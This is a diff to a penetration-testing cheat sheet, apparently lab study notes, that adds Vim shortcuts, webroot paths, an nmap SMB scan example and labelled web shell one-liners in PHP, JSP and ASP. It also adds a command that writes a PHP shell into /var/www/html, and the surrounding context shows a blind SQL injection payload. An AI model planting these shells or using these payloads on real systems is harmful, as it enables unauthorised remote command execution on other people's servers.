@@ -13,6 +13,7 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [Vim](#vim)
   - [NMAP](#nmap)
   - [feroxbuster](#feroxbuster)
   - [gobuster](#gobuster)
@@ -55,6 +56,7 @@
 - [Password Attacks](#password_attacks)
 - [Web Attacks](#web-attacks)
   - [Checklist](#checklist)
+  - [Webroot](#webroot)
   - [General Tips](#general-tips)
   - [API Response](#api-response)
   - [Filemanater](#filemanager)
@@ -177,9 +179,16 @@ $powershell -enc $EncodedText
 
 ## Web Shell
 ```bash
+# php
 <?php system($_REQUEST["cmd"]); ?>
+
+# jsp
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+# asp
 <% eval request("cmd") %>
+
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 
 
 
@@ -435,6 +444,22 @@ http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -
 ```
 
 ## Tools
+### Vim
+```bash
+x	Cut character
+dw	Cut word
+dd	Cut full line
+yw	Copy word
+yy	Copy full line
+p	Paste
+:1	Go to line number 1.
+:w	Write the file, save
+:q	Quit
+:q!	Quit without saving
+:wq	Write and quit
+
+```
+
 ### NMAP
 ```bash
 # locate certain scripts
@@ -442,6 +467,7 @@ locate scripts/citrix
 
 # running nmap script
 nmap --script <script name> -p<port> <host>
+nmap --script smb-os-discovery.nse -p445 10.10.10.40
 
 # banner grabbing
 nmap -sV --script=banner <target>
@@ -1128,6 +1154,14 @@ ssh -N -R 9998 kali@192.168.118.4
 - POST/GET with burp suite
 - Any .config, .conf files?
 - Combination with SQLi and other webpage that we know wehre its root location is
+
+## Webroot
+```bash
+Apache	/var/www/html/
+Nginx	/usr/local/nginx/html/
+IIS	c:\inetpub\wwwroot\
+XAMPP	C:\xampp\htdocs\
+```
 
 ## General Tips
 - Try "Jetty exploit", "Jetty RCE", "Jetty Remote Code Execution"...
